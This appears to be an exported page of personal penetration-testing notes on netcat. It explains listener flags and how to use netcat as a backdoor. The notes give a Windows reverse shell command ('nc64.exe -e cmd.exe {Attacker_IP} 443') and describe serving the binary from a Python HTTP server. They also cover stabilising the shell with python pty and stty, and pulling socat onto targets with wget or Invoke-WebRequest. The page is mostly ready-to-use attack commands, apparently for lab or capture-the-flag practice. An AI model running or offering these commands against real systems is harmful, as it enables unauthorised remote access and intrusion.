<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>netcat</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>netcat</h1><br/><p>nc -h</p><p></p><p><img src="images/19-1.png" alt="images/19-1.png" /></p><p></p><p>nc -lvnp 8000</p><p>or</p><p>rlwrap nc -lvnp 8000</p><p></p><p>l : Listening mode.</p><p>v : Verbose mode. Displays status messages in more detail.</p><p>n : Numeric-only IP address. No hostname resolution. DNS is not being used.</p><p>p : Port. Use to specify a particular port for listening.</p><p></p><p><img src="images/19-2.png" alt="images/19-2.png" /></p><p></p><p></p><p>netcat (often abbreviated to nc) is a computer networking utility for reading from and</p><p>writing to network connections using TCP or UDP. The command is designed to be a</p><p>dependable back-end that can be used directly or easily driven by other programs and</p><p>scripts. At the same time, it is a feature-rich network debugging and investigation</p><p>tool, since it can produce almost any kind of connection its user could need and has</p><p>several built-in capabilities. Its list of features includes port scanning,</p><p>transferring files, and port listening: as with any server, <strong>it can be used as a</strong></p><p><strong>backdoor.</strong></p><p></p><p></p><p>To use as Backdoor :</p><p></p><p><a href="https://github.com/int0x33/nc.exe/blob/master/nc64.exe?source=post_page-----a2ddc3557403----------------------">https://github.com/int0x33/nc.exe/blob/master/nc64.exe?source=post_page-----a2ddc3557403----------------------</a></p><p><a href="https://github.com/CybeXRay/nc.exe">https://github.com/CybeXRay/nc.exe</a></p><p></p><p>We will attempt to get a stable reverse shell. We will upload the nc64.exe binary to the target</p><p>machine and execute an interactive cmd.exe process on our listening port.</p><p></p><p>We navigate to the folder and then start the simple HTTP server, then the netcat listener in a different tab by</p><p>using the following commands:</p><p></p><p>sudo python3 -m http.server 80    ---------------- Web server for the Target machine to download the nc64.exe</p><p>sudo nc -lvnp 443							 ---------------- Our NC listner in the Attacker machine</p><p></p><p></p><p>Running the Backdoor in Target machine:</p><p>.\nc64.exe -e cmd.exe {Attacker_IP} 443   ------------As we are listening in 443</p><p></p><p></p><p></p><p><strong>Stabilizing the shell got using rougue server technique:</strong></p><p></p><p>Once we receive the output from the Rogue server, a shell spawns on our Netcat listener and we can</p><p>upgrade the terminal shell using the following command.</p><p></p><p>script /dev/null -c bash</p><p></p><p></p><p><strong></strong></p><p><strong>To Read/Connect A Server with a Port:</strong></p><p>(Can be used for Bind shells)</p><p></p><p></p><p>nc {Server_IP} {Port}</p><p></p><p>Example:</p><p><h3>nc 209.97.131.64 32522</h3></p><p></p><p></p><p><strong>Stablization of Netcat:</strong></p><p></p><p><strong>A) Using Python</strong>--------------&gt;</p><p>(Linux)</p><p>python -c ‘import pty;pty.spawn(&quot;/bin/bash&quot;)’						(if required use python2 or python3)</p><p>export TERM=xterm																(this will give us access to term commands such as clear)</p><p>Ctrl+Z																						(Background the shell)</p><p>stty raw -echo; fg																	(This does two things: first, it turns off our own terminal echo. It then foregrounds the shell. )</p><p></p><p>stty raw -echo; fg</p><p>This does two things: first, it turns off our own terminal echo (which gives us access to tab autocompletes, the arrow keys, and Ctrl + C to kill processes). It then foregrounds the shell, thus completing the process. </p><p></p><p><strong>Note:</strong> As we have disabled echo in our own terminal. If the shell dies, we won&#39;t be able to see any inputs. Thus we need to use “<strong>reset</strong>” and enter.</p><p></p><p><strong>B) Using rlwrap-----------------&gt;</strong></p><p>(Mainly used for Windows)</p><p>rlwrap is a program which, in simple terms, gives us access to history, tab autocompletion and the arrow keys immediately upon receiving a shell; however, some manual stabilisation must still be utilised if you want to be able to use Ctrl + C inside the shell.</p><p>(Windows)</p><p>rlwrap nc -lvnp &lt;port&gt;</p><p>Then do the step 3 &amp; 4 to turn of our own system&#39;s echo</p><p></p><p><strong>C) Socat shell-----------------------&gt;</strong></p><p>(Mainly used for Linux, Windows shell will have same stability as netcat)</p><p></p><p>First, transfer a socat static compiled binary program preferably over http server.</p><p>Download from <a href="https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true">https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true</a></p><p>Then host it in our local python web server</p><p></p><p>Linux target							:	wget &lt;LOCAL-IP&gt;/socat -O /tmp/socat</p><p>Windows target(powershell)	: 	Invoke-WebRequest -uri &lt;LOCAL-IP&gt;/socat.exe -outfile C:\\Windows\temp\socat.exe</p><p></p><p><strong>Note:</strong> Invoke-WebRequest or a webrequest system class, depending on the version of Powershell installed </p><p></p><p></p><p><strong>Changing Terminal Size, mainly used for text editors such as Vim or Nano to run properly:</strong></p><p></p><p>In our own terminal run,</p><p>cd /tmp; stty -a</p><p>Get the values of “rows” &amp; “columns”</p><p></p><p>Then in our target machine shell run,</p><p>stty rows &lt;number&gt;</p><p>stty cols &lt;number&gt;</p><p></p><p></p><p></p><p></p><p></p></div>
</body>
</html>
